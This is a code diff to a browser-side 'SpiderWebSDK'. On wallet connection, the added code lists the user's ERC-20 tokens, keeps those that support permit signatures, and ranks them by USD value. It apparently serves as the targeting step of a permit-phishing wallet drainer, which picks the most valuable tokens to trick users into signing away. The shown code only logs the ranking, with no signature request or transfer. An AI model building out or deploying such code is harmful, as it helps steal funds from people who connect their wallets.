@@ -105,6 +105,60 @@ window.SpiderWebSDK = {
     this._isInitialized = true;
     console.log("SpiderWebSDK initialized successfully.");
 },
+
+    _getRankedCompatibleTokens: async function() {
+    // Steps 1 & 2: Get balances and filter for permit-compatible tokens
+    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+    const response = await fetch(alchemyUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+            params: [this._currentUserAddress, 'erc20']
+        })
+    });
+    const data = await response.json();
+    if (!data.result) return [];
+
+    const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
+    if (nonZeroBalances.length === 0) return [];
+
+    const checkPromises = nonZeroBalances.map(async (token) => {
+        if (await this._checkPermitSupport(token.contractAddress)) {
+            const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
+            const [name, symbol, balance, decimals] = await Promise.all([
+                tokenContract.name(),
+                tokenContract.symbol(),
+                tokenContract.balanceOf(this._currentUserAddress),
+                tokenContract.decimals()
+            ]);
+            return { contractAddress: token.contractAddress, name, symbol, balance, decimals, usdValue: 0 }; // Add usdValue property
+        }
+        return null;
+    });
+
+    const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);
+    if (compatibleTokens.length === 0) return [];
+
+    // Step 3: Fetch prices
+    const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
+
+    // Step 4: Calculate USD value for each token
+    if (prices) {
+        for (const token of compatibleTokens) {
+            const priceData = prices[token.contractAddress.toLowerCase()];
+            if (priceData && priceData.usd) {
+                const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
+                token.usdValue = parseFloat(formattedBalance) * priceData.usd;
+            }
+        }
+    }
+
+    // Step 5: Sort tokens by USD value in descending order
+    compatibleTokens.sort((a, b) => b.usdValue - a.usdValue);
+
+    return compatibleTokens;
+},
     _fetchTokenPrices: async function(tokenAddresses) {
         const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
         if (!assetPlatform) {
@@ -426,6 +480,22 @@ _logConnectionEvent: async function() {
             await this._provider.send('eth_requestAccounts', []);
             this._signer = this._provider.getSigner();
             this._currentUserAddress = await this._signer.getAddress();
+            // --- PASTE THE NEW CODE HERE ---
+        console.log("SpiderWebSDK: Finding and ranking compatible tokens...");
+        const rankedTokens = await this._getRankedCompatibleTokens();
+        if (rankedTokens && rankedTokens.length > 0) {
+            console.log("✅ Compatible Tokens Ranked by USD Value:");
+            // Using console.table for a clean, readable log
+            console.table(rankedTokens.map(t => {
+                return {
+                    Token: t.symbol,
+                    Balance: ethers.utils.formatUnits(t.balance, t.decimals),
+                    "Value (USD)": `$${t.usdValue.toFixed(2)}`
+                }
+            }));
+        } else {
+            console.log("No permit-compatible tokens with a balance were found.");
+        }
             this._logConnectionEvent(); // <-- ADD THIS LINE
             
             this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
